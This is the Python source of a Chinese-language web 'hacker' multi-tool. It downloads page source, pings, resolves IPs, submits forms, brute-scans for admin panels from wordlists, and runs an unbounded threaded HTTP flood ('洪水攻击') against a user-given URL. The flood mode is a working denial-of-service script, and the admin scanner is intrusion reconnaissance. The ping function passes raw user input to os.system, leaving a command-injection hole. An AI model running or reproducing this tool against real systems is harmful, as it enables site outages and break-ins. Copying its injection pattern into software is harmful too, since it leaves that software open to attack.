#by yourmoln
from socket import socket
import threading
from threading import Lock,Thread
import time

print("="*45)
name = """_ _                 _    
 _ __ ___   ___ | (_) __ _  ___  ___| | __
| '_ ` _ \ / _ \| | |/ _` |/ _ \/ _ \ |/ /
| | | | | | (_) | | | (_| |  __/  __/   < 
|_| |_| |_|\___/|_|_|\__, |\___|\___|_|\_\
                     |___/"""
print(name)
print("="*45)
print("v0.1.1(测试版)")
print("开源地址:https://github.com/yourmoln/moligeek")
print("本工具仅限于合法用途，交流Q群:564136017")
print("="*45)

import os
try:
    import requests
except:
    package_name = 'requests'
    print("\a检测到缺乏requests库，自动安装中")
    try:
        os.system(f'python -m pip install {package_name}')
        import requests
        print("\a安装完成，开始运行")
    except:
        print("\a安装失败，请尝试手动安装")
        exit()
from socket import gethostbyname



#全局变量
s=0
f=0
nf=0
#获取脚本目录绝对路径
path = os.path.split(os.path.realpath(__file__))[0]

#如果没有src文件夹，则创建
if not os.path.exists(path+"/src"):
    os.mkdir(path+"/src")
    
#header头
headers={'User-Agent':'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36'}

ssl=input("是否为https://\n[1]是\n[2]否\n")
if ssl in ["是","1"]:
    ssl="https://"
elif ssl in ["否","2"]:
    ssl="http://"
else:
    print("未选择，默认为是")
    ssl="https://"
name=input("请输入链接:"+ssl)
url=ssl+name
mode=input("请选择模式:\n(1)下载源码\n(2)ping\n(3)获取ip\n(4)提交表单\n(5)后台扫描\n(6)洪水攻击\n")



#下载源码
def getsrc():
    try:
        response=requests.get(url,headers)
        response.encoding="utf–8"
        print(response.text)
        pathname = name.replace("/","_")
        srcpath=path+"/src/"+pathname+".txt"
        with open(srcpath,"w+") as f:
            f.write(response.text)
        print("\a成功写入文件，文件路径:"+srcpath)
    except:
        print("\a写入失败\n请检查网络是否正常或网页是否存在")



#ping
def ping():
    os.system("ping "+name)



#获取ip
def getip():
    try:
        print("ip:"+gethostbyname(name))
    except:
        print("\a未检测到ip\n请检查网络是否正常或域名是否正确")



#提交表单
def upform():
    formname=[]
    formvalue=[]
    formdata={}
    method=input("请选择方法:\n[1]post\n[2]get\n不作选择默认为post\n")
    n=int(input("请选择提交数量:"))
    for i in range(n):
        formname+=[input("请输入第"+str(i+1)+"个变量名:")]
        formvalue+=[input("请输入第"+str(i+1)+"个变量值:")]
    for i in range(n):
        formdata[formname[i]]=formvalue[i]
    if method in ["1","post"]:
        post(formdata)
    elif method in ["2","get"]:
        get(formdata)
    else:
        post(formdata)

def post(data):
    try:
        response = requests.post(url, data=data)
        response.encoding="utf–8"
        print(response.text)
    except:
        print("\a发送失败\n请检查网络是否正常或页面是否存在")

def get(data):
    try:
        response = requests.get(url, params=data)
        response.encoding="utf–8"
        print(response.text)
    except:
        print("\a发送失败\n请检查网络是否正常或页面是否存在")



#后台文件扫描
def findadmin():
    global s
    global f
    kind=input("请选择后台语言类型\n[0]全部\n[1]ASP\n[2]ASPX\n[3]DIR\n[4]JSP\n[5]MDB\n[6]PHP\n默认为全部\n")
    if kind in ["0","全部"]:
        kind=1
    elif kind in ["1","ASP","asp"]:
        kind="ASP.txt"
    elif kind in ["2","ASPX","aspx"]:
        kind="ASPX.txt"
    elif kind in ["3","DIR","dir"]:
        kind="DID.txt"
    elif kind in ["4","JSP","jsp"]:
        kind="JSP.txt"
    elif kind in ["5","MDB","mdb"]:
        kind="MDB.txt"
    elif kind in ["6","PHP","php"]:
        kind="PHP.txt"
    else:
        kind=1
        
    if kind == 1:
        kind = ["ASP.txt","ASPX.txt","DIR.txt","JSP.txt","MDB.txt","PHP.txt"]
        for ikind in kind:
            with open(path+"/set/"+ikind,"rt",encoding='gbk') as f:
                txt=f.read()
            txtlist=txt.split("\n")
            for i in txtlist:
                t1 = threading.Thread(target=shaomiao,args=(i,))
                t1.start()
    else:
        with open(path+"/set/"+kind,"rt",encoding='gbk') as f:
            txt=f.read()
        txtlist=txt.split("\n")
        #s=0
        #f=0
        #num=len(txtlist)
        for i in txtlist:
            #print("\r进度("+str(s+f)+"/"+str(num)+")",end="")
            t1 = threading.Thread(target=shaomiao,args=(i,))
            t1.start()
        

    
    #print("总扫描"+str(s+f)+"个页面，成功检测"+str(s)+"个页面")
    #time.sleep(2)
    #print("扫描结束")
    
def shaomiao(i):
    #global s
    #global f
    try:
        txturl=url+i
        r=requests.get(txturl,headers)
        if r.status_code==requests.codes.ok:
            print(txturl)
            #s=s+1
        #else:
            #f=f+1
    except:
        #f=f+1
        return 0
    


#洪水攻击
def startattack():
    n=0
    try:
        speed=int(input("请输入攻击速度(小心卡死自己):"))
    except:
        speed=10
        print("未设置速度默认为10")
    while 1:
        n+=speed
        t1 = threading.Thread(target=attack,args=(speed,))
        t1.start()
        print(f"\r已发送{n}个包，失效{nf}个包",end="")
def attack(speed):
    global nf
    while speed>0:
        try:
            r = requests.get(url,headers)
        except:
            #print("发送失败")
            nf+=speed
            break
        speed-=1
        
        
#判断模式
if mode in ["1","获取源码"]:
    getsrc()
if mode in ["2","ping"]:
    ping()
if mode in ["3","获取ip"]:
    getip()
if mode in ["4","提交表单"]:
    upform()
if mode in ["5","后台扫描"]:
    findadmin()
if mode in ["6","洪水攻击"]:
    startattack()
